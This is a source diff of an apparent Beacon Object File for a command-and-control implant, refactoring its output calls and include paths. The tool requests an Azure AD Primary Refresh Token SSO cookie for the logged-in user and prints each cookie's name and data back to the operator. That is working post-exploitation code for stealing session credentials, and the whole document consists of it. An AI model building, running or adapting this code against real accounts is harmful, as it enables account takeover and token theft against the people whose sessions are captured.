@@ -3,10 +3,10 @@
 #include <winhttp.h>
 
 #ifdef BOF
-#define DYNAMIC_LIB_COUNT
-#include "beacon.h"
-#include "bofdefs.h"
-#include "base.c"
+#define DYNAMIC_LIB_COUNT 3
+#include "../common/beacon.h"
+#include "../common/bofdefs.h"
+#include "../common/base.c"
 #define MSVCRT$wcscpy ((wchar_t* (*)(wchar_t*, const wchar_t*))DynamicLoad("MSVCRT", "wcscpy"))
 #define MSVCRT$wcslen ((size_t (*)(const wchar_t*))DynamicLoad("MSVCRT", "wcslen"))
 #define MSVCRT$strstr ((char* (*)(const char*, const char*))DynamicLoad("MSVCRT", "strstr"))
@@ -19,11 +19,9 @@
 #define OLE32$CoTaskMemFree ((void (*)(LPVOID))DynamicLoad("OLE32", "CoTaskMemFree"))
 #else
 #define BeaconPrintf(x, y, ...) printf(y, ##__VA_ARGS__)
+#define internal_printf(y, ...) printf(y, ##__VA_ARGS__)
 #define CALLBACK_ERROR 0
 #define CALLBACK_OUTPUT 0
-#endif
-
-#ifndef BOF
 #define MSVCRT$strstr strstr
 #define MSVCRT$wcscpy wcscpy
 #define MSVCRT$wcslen wcslen
@@ -168,7 +166,7 @@ BOOL GetAADNonce() {
         totalRead += dwRead;
         fullBuffer[totalRead] = '\0';
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Response size: %lu\n", totalRead);
+    internal_printf("[+] Response size: %lu\n", totalRead);
 
     if (fullBuffer && totalRead > 0) {
         char* configStart = MSVCRT$strstr(fullBuffer, "$Config=");
@@ -207,7 +205,7 @@ BOOL RequestAADPRT(const wchar_t* nonce) {
     wchar_t uri[1024] = {0};
     BOOL success = FALSE;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting PRT request with nonce\n");
+    internal_printf("[+] Starting PRT request with nonce\n");
 
     swprintf_s(uri, 1024, L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=%s", nonce);
 
@@ -250,15 +248,15 @@ BOOL RequestAADPRT(const wchar_t* nonce) {
         goto cleanup;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %lu cookies:\n", cookieCount);
+    internal_printf("[+] Found %lu cookies:\n", cookieCount);
     for (DWORD i = 0; i < cookieCount; i++) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Cookie %lu:\n", i + 1);
-        BeaconPrintf(CALLBACK_OUTPUT, "  Name: %ls\n", cookies[i].name);
-        BeaconPrintf(CALLBACK_OUTPUT, "  Data: %ls\n", cookies[i].data);
-        BeaconPrintf(CALLBACK_OUTPUT, "  Flags: 0x%x\n", cookies[i].flags);
+        internal_printf("Cookie %lu:\n", i + 1);
+        internal_printf("  Name: %ls\n", cookies[i].name);
+        internal_printf("  Data: %ls\n", cookies[i].data);
+        internal_printf("  Flags: 0x%x\n", cookies[i].flags);
 
         if (cookies[i].p3pHeader) {
-            BeaconPrintf(CALLBACK_OUTPUT, "  P3PHeader: %ls\n", cookies[i].p3pHeader);
+            internal_printf("  P3PHeader: %ls\n", cookies[i].p3pHeader);
         }
         
         if (cookies[i].name) OLE32$CoTaskMemFree(cookies[i].name);
@@ -284,7 +282,7 @@ VOID go(char* args, int len) {
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting AAD PRT request process\n");
+    internal_printf("[+] Starting AAD PRT request process\n");
 
     if (!GetAADNonce()) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve AAD nonce\n");
@@ -296,10 +294,11 @@ VOID go(char* args, int len) {
             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to request AAD PRT\n");
             return;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] AAD PRT request completed\n");
+        internal_printf("[+] AAD PRT request completed\n");
     }
 
     printoutput(TRUE);
+    bofstop(); //offload loaded libraries
 }
 #else
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
